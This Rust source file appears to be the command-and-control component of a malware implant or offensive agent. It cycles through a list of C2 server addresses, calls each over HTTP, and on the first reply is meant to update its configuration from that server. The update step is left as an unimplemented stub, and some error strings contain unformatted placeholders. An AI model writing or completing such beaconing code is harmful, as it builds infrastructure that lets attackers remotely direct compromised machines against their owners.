// Command and Control logic
use log::{error, info, warn};
use reqwest::Response;

// IPv4
type Addr = String;

pub fn get_commands(c2: Vec<Addr>) {
    if c2.len() <= 0 {
        error!("no c2 server specified")
    } else {
        for addr in c2 {
            // once we find a valid c2 server, stop looking
            if try_callout(&addr).is_ok() {
                update_conf(&addr);
                break;
            }
            // warn about invalid c2 servers
            else {
                error!("{addr:?} no longer valid c2 server")
            }
        }
    }
}

fn update_conf(addr: &Addr) -> () {
    todo!("update conf from c2 at {addr:?}")
}

fn try_callout(addr: &Addr) -> Result<(), &'static str> {
    if let Ok(response) = reqwest::blocking::get(addr) {
        if let Ok(body) = response.text() {
            info!("response: {body:?}");
            Ok(())
        } else {
            Err("Could not read body of {response:?}")
        }
    } else {
        Err("Did not get response from {addr:?}")
    }
}
